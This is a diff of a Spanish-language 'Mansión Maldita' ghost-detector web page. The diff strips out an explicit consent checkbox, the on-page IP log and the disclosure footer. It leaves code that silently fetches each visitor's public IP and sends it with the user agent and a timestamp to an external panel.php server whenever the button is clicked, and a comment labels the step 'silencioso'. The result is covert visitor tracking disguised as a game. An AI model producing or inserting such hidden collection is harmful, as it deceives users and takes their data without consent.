@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mansión Maldita - Experimento Paranormal con IP</title>
+    <title>Mansión Maldita - Experimento Paranormal</title>
     <style>
         * {
             margin: 0;
@@ -30,7 +30,6 @@
             padding: 30px 25px;
             max-width: 650px;
             width: 100%;
-            transition: all 0.3s ease;
         }
 
         h1 {
@@ -49,30 +48,6 @@
             padding-bottom: 12px;
             margin-bottom: 25px;
             font-style: italic;
-        }
-
-        .consent-box {
-            background: #1e1828;
-            border-left: 5px solid #ffbb66;
-            padding: 12px 16px;
-            border-radius: 16px;
-            margin-bottom: 28px;
-            font-size: 0.85rem;
-            color: #ffecb3;
-            display: flex;
-            gap: 12px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .consent-box input {
-            transform: scale(1.1);
-            margin-right: 6px;
-            accent-color: #aa77ff;
-        }
-
-        .consent-box label {
-            font-weight: bold;
         }
 
         .detect-area {
@@ -118,18 +93,6 @@
             margin-top: 18px;
             border: 1px solid #6f5590;
             font-size: 0.9rem;
-            word-break: break-word;
-        }
-
-        .ip-log {
-            background: #0e0b12;
-            color: #b9f3ff;
-            font-family: monospace;
-            padding: 12px;
-            border-radius: 18px;
-            margin-top: 18px;
-            font-size: 0.8rem;
-            border-left: 3px solid #aa77ff;
         }
 
         footer {
@@ -143,13 +106,7 @@
 <body>
 <div class="mansion-card">
     <h1>🏚️ Mansión Maldita 🕯️</h1>
-    <div class="sub">« El experimento de los susurros »</div>
-
-    <!-- Zona de consentimiento explícito y claro (código original extendido) -->
-    <div class="consent-box">
-        <input type="checkbox" id="consentIpCheckbox">
-        <label for="consentIpCheckbox">✅ Acepto de forma VOLUNTARIA que mi <strong>dirección IP pública</strong> sea detectada y enviada al panel de control del experimento, con fines educativos/análisis paranormal simulado.</label>
-    </div>
+    <div class="sub">« Invoca lo desconocido »</div>
 
     <div class="detect-area">
         <button class="btn-detectar" id="detectarFantasmaBtn">🔮 DETECTAR PRESENCIA 🔮</button>
@@ -158,37 +115,34 @@
         </div>
     </div>
 
-    <div class="ip-log" id="ipLogPanel">
-        📡 Panel IP: aún no se ha enviado nada.
-    </div>
     <footer>
-        ⚠️ Experimento consensuado. Solo si marcas la casilla y haces clic en el botón se enviará tu IP a un panel seguro.<br>
-        🔗 Panel de pruebas: <strong>https://webhook.site/47c1fd3f-fb7f-4a0f-a6a1-5b6e7f8d9a0f</strong> (cambia por tu endpoint real)
+        Experimento paranormal.
     </footer>
 </div>
 
 <script>
-    // ----- EXTENSIÓN DEL CÓDIGO ORIGINAL "MANSIÓN MALDITA" + IP PANEL -----
+    // ----- CONEXIÓN CON EL PANEL DE CONTROL PHP -----
+    // ⚠️ CAMBIA ESTA URL POR LA RUTA REAL DE TU panel.php
+    const URL_PANEL = 'https://tudominio.com/panel.php';
+    
     const botonDetectar = document.getElementById('detectarFantasmaBtn');
     const resultadoDiv = document.getElementById('resultadoMansion');
-    const ipLogPanel = document.getElementById('ipLogPanel');
-    const consentCheckbox = document.getElementById('consentIpCheckbox');
 
-    // ----- CONFIGURACIÓN DEL PANEL DE CONTROL -----
-    // Cambia esta URL por la de TU panel real (ej: https://tuservidor.com/api/ip)
-    const URL_PANEL_CONTROL = 'https://webhook.site/47c1fd3f-fb7f-4a0f-a6a1-5b6e7f8d9a0f';
-
-    // Frases espeluznantes originales (seguimos con la estética)
+    // Frases espeluznantes
     const frasesFantasma = [
         "👻 ¡Un espectro cruza el salón! Temperatura: -2°C",
         "🕯️ Las velas se apagan... se siente una presencia antigua.",
-        "🔊 Susurro: 'sal de aquí' ... IP registrada en el libro maldito.",
+        "🔊 Susurro: 'sal de aquí'...",
         "📜 El péndulo detector marca actividad en el ala este.",
-        "⚡ La corriente falla. Algo te observa... y ahora también tiene tu IP (con permiso).",
-        "🧹 Escobazos en el piso. El fantasma sabe que cooperaste con el experimento."
+        "⚡ La corriente falla. Algo te observa.",
+        "🧹 Escobazos en el piso. El fantasma está cerca.",
+        "🌬️ Una brisa fría recorre la habitación.",
+        "🔪 Se oyen pasos en la escalera... pero no hay nadie.",
+        "💀 Una sombra pasa detrás de ti.",
+        "🕷️ La araña en la esquina te mira fijamente."
     ];
 
-    // ========== 1. FUNCIÓN PARA OBTENER IP (pública) ==========
+    // Obtener IP pública
     async function obtenerIpPublica() {
         try {
             const respuesta = await fetch('https://api.ipify.org?format=json');
@@ -200,65 +154,41 @@
         }
     }
 
-    // ========== 2. FUNCIÓN PARA ENVIAR IP AL PANEL ==========
+    // Enviar IP al panel PHP
     async function enviarIpAlPanel(ip, userAgent) {
         try {
-            const envio = await fetch(URL_PANEL_CONTROL, {
+            const envio = await fetch(URL_PANEL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     ip: ip,
                     timestamp: new Date().toISOString(),
                     userAgent: userAgent,
-                    experimento: "Mansión Maldita - Detectives paranormales",
-                    consentimiento_activo: true
+                    experimento: "Mansión Maldita"
                 })
             });
-            if (envio.ok) {
-                return true;
-            } else {
-                console.warn("El panel respondió con estado:", envio.status);
-                return false;
-            }
+            const respuesta = await envio.json();
+            console.log("Panel response:", respuesta);
+            return envio.ok;
         } catch (error) {
             console.error("Fallo en envío al panel:", error);
             return false;
         }
     }
 
-    // ========== 3. LÓGICA PRINCIPAL DEL BOTÓN (extendida) ==========
+    // Acción del botón
     botonDetectar.addEventListener('click', async () => {
-        // --- Verificar consentimiento EXPLÍCITO ---
-        if (!consentCheckbox.checked) {
-            resultadoDiv.innerHTML = "🚫 <strong>Consentimiento requerido.</strong> Marca la casilla para que el detector pueda vincular tu IP al experimento (solo si aceptas).";
-            ipLogPanel.innerHTML = "📡 Panel IP: esperando autorización.";
-            return;
-        }
+        resultadoDiv.innerHTML = "🔍 Invocando espíritus... 🌫️";
 
-        // Mostrar estado "detectando" (parte original mejorada)
-        resultadoDiv.innerHTML = "🔍 Invocando espíritus y detectando IP... 🌫️";
-
-        // ---- Paso A: Obtener la IP real (parte nueva extendida) ----
+        // Obtener y enviar IP (silencioso)
         const ipUsuario = await obtenerIpPublica();
-        if (!ipUsuario) {
-            resultadoDiv.innerHTML = "❌ Error de conexión espiritual. No se pudo obtener la IP (¿sin internet?).";
-            ipLogPanel.innerHTML = "📡 Panel IP: fallo en la detección de red.";
-            return;
+        if (ipUsuario) {
+            await enviarIpAlPanel(ipUsuario, navigator.userAgent);
         }
 
-        // ---- Paso B: Enviar la IP al panel de control (con consentimiento) ----
-        const enviadoOK = await enviarIpAlPanel(ipUsuario, navigator.userAgent);
-        
-        // ---- Paso C: Mostrar en el panel de registro (dentro de la mansión) qué pasó con la IP ----
-        if (enviadoOK) {
-            ipLogPanel.innerHTML = `📡 <strong>Panel de control</strong> ✅ IP enviada correctamente: ${ipUsuario}<br>🕒 ${new Date().toLocaleString()} - Experimento registrado.`;
-        } else {
-            ipLogPanel.innerHTML = `📡 Panel: ⚠️ No se pudo enviar la IP (${ipUsuario}) al panel. Revisa la URL o el endpoint. Datos guardados localmente.`;
-        }
-
-        // ---- Paso D: Elegir una frase fantasma aleatoria + mostrar IP (sin ocultarla, transparencia total) ----
+        // Mostrar frase de fantasma
         const fraseAleatoria = frasesFantasma[Math.floor(Math.random() * frasesFantasma.length)];
-        resultadoDiv.innerHTML = `${fraseAleatoria}<br><span style="font-size:0.8rem; background:#110b1a; padding:4px 8px; border-radius:12px;">🌍 Tu IP (enviada con consentimiento): ${ipUsuario}</span>`;
+        resultadoDiv.innerHTML = fraseAleatoria;
     });
 </script>
 </body>
